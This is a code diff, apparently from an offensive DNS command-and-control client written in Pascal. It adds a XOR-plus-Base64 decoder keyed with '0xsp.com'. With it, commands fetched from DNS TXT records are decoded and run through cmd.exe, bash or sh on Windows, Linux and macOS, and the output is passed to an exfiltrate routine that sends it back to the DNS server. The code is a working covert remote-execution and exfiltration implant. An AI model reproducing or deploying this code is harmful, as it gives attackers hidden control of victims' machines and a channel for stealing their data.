@@ -171,7 +171,34 @@ Begin
   End;
 End;
 
-
+ Function XorDecodeBase64(Const What: String): String;
+Var P: Pointer;
+    L: Cardinal;
+    M: TMemoryStream;
+    key:string;
+Begin
+  //Uses Base64
+  key := '0xsp.com';
+  M:= TMemoryStream.Create;
+  Try
+    M.Write(What[1], Length(What));
+    M.Position:= 0;
+    GetMem(P, M.Size);
+    Try
+      With TBase64DecodingStream.Create(M) Do Try
+        L:= Read(P^, M.Size);
+        XorCrypt(P^, L, Key);
+        SetString(Result, PAnsiChar(P), L);
+      Finally
+        Free;
+      End;
+    Finally
+      FreeMem(P);
+    End;
+  Finally
+    M.Free;
+  End;
+End;
 
 function TestXorBase64(s:string):string;
 Var  Key, B64: String;
@@ -244,17 +271,17 @@ begin
   DNSd.TargetHost := i_host;
 
   if DNSd.DNSQuery('live.'+i_host, QTYPE_TXT, p2) then
-   writeln(length('[!] DNS Query Length: '+p2.text)); // length of accepted DNS query
+   writeln('[!] DNS Query Length: ',(length(p2.text))); // length of accepted DNS query
    if length(p2.text) > 1 then
-  writeln('[+] Yo! Command captured  <-'+p2.text);
+  writeln('[+] Yo! Recieving Encrypted command [ '+p2.text+' ]');
    {$IFDEF Windows} // for windows env
-  RunCommand(systemfolder+'\cmd.exe',['/c',p2.text],str);
+  RunCommand(systemfolder+'\cmd.exe',['/c',XorDecodeBase64(p2.text)],str);
    {$IFEND}
    {$IFDEF linux}   //for Linux env
-    RunCommand('/bin/bash',['-c',p2.text],str);
+    RunCommand('/bin/bash',['-c',XorDecodeBase64(p2.text)],str);
    {$IFEND}
    {$IFDEF darwin}
-    RunCommand('/bin/sh',['-c',p2.text],str);
+    RunCommand('/bin/sh',['-c',XorDecodeBase64(p2.text)],str);
    {$IFEND}
 
   exfiltrate(str); // send command results into dns server
